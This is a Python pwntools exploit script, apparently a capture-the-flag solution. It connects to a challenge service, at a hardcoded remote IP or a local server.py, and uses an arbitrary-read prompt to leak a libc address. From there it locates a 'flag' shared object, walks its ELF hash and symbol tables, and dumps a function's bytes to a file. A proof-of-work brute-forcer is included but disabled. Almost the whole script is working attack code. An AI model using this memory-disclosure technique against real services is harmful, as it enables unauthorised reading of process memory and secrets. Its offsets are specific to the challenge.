from pwn import *
context.arch='amd64'
context.log_level='debug'

s=0
if s==1:
    p=remote('39.101.177.128',9999)
else:
    p=process(['/usr/bin/python', 'server.py'])
#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))        #in case that data is an int
sa      = lambda delim,data         :p.sendafter(str(delim), str(data)) 
sl      = lambda data               :p.sendline(str(data)) 
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data)) 
r       = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
it      = lambda                    :p.interactive()
uu32    = lambda data   :u32(data.ljust(4, '\0'))
uu64    = lambda data   :u64(data.ljust(8, '\0'))
def bp():
    raw_input()
#-----------------------------------------------------------------------------------------
def calc_hash(name):
    h=5381
    for i in range(len(name)):
        h=ord(name[i])+h*33
    h=h&0xffffffff
    print hex(h)
    return h
def checkpow(prefix,answer):
    hashresult=hashlib.sha256(prefix+answer).digest()
    bits=''.join(bin(ord(i))[2:].zfill(8) for i in hashresult)
    if bits.startswith('0'*20)!=0:
        #print bits[:16]
        return 1
    else:
        return 0
def pas():
    ru('(')
    prefix=ru('+?')
    for a in string.ascii_letters + string.digits:
        for b in string.ascii_letters + string.digits:
            for c in string.ascii_letters + string.digits:
                for d in string.ascii_letters + string.digits:
                    if checkpow(prefix,a+b+c+d):
                        return a+b+c+d

#ans=pas()

#sla("')",ans)

#sl('1'*32)
sla('addr?:', '8de288')
__libc_start_main = u64(r(8))
success('__libc_start_main: ' + hex(__libc_start_main))
libc_addr = __libc_start_main - 0x000000000020750+0x7f72fae70000-0x7f72fae6fff0
success('libc_address: ' + hex(libc_addr))
flag_so_addr = libc_addr - 0x22F1000
success('flag_so_addr: ' + hex(flag_so_addr))

hash_bucket_flag=flag_so_addr+0x2200+0x1205*4
sla('addr?:', hex(hash_bucket_flag))
hash_index=uu32(r(4))
success('hash_index'+hex(hash_index))

sym_addr=0x13EA0+(hash_index+1)*0x18
sla('addr?:', hex(flag_so_addr+sym_addr+8))

func_addr=uu64(r(8))
success('func_addr'+hex(func_addr))

sla('addr?:', hex(flag_so_addr+func_addr+0x17))
bin_content=r(16)
sla('addr?:', hex(flag_so_addr+func_addr+0x27))
bin_content+=r(16)

with open('bin_content','wb') as f:
    f.write(bin_content)